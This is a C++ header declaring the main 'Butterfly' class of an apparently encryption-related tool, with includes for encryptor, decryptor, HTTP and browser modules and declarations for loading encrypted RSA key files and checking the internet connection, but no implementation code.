
#ifndef BUTTERFLY_BUTTERFLY_H
#define BUTTERFLY_BUTTERFLY_H

#include <memory>

#include "argumentParser.h"
#include "crypto/encryptor.h"
#include "crypto/decryptor.h"
#include "httpServer.h"
#include "httpClient.h"
#include "connManager.h"
#include "browser.h"
#include "logger.h"

namespace butterfly
{

/**
 * Class Butterfly for all blfy related tasks
 */
class Butterfly
{

private:
    std::vector<std::pair<std::string, std::string>> _formParamVec;
    std::unique_ptr<butterfly::ArgumentParser> _argparse;
    std::unique_ptr<butterfly::ConnManager> _connManager;
    butterfly::ArgumentParser::Arguments _args;
    std::string BROWSER_URL_PORT;

    /**
     * Init logging Framework
     */
    void initLoggingFramework();

    /**
     * Loads the encrypted CPrivateRSA.bin file and the RSA.bin and converts the content to hex
     *
     * @param cprivateRSAFileHex: string reference to the hex representation of the CPrivateRSA.bin file
     * @param rsaFileHex : string reference to the hex representation of the RSA.bin file
     */
    void loadEncryptedFiles(std::string &cprivateRSAFileHex, std::string &rsaFileHex);

    /**
     * Checks the internet connection before any remote action
     */
    void checkInternetConnection();

public:

    /**
     * Constructor Butterfly
     *
     *  Usage:
     *       std::unique_ptr<butterfly::Butterfly> blfy(new butterfly::Butterfly(argc, argv));
     *       blfy->run();
     *
     * @param argc: number of arguments
     * @param argv: char* of arguments
     */
    Butterfly(int argc, char *argv[]);

    /**
     * Destructor Butterfly
     */
    ~Butterfly() = default;

    /**
     * Run method for Butterfly
     */
    void run();

};

} // namespace butterfly

#endif //BUTTERFLY_BUTTERFLY_H
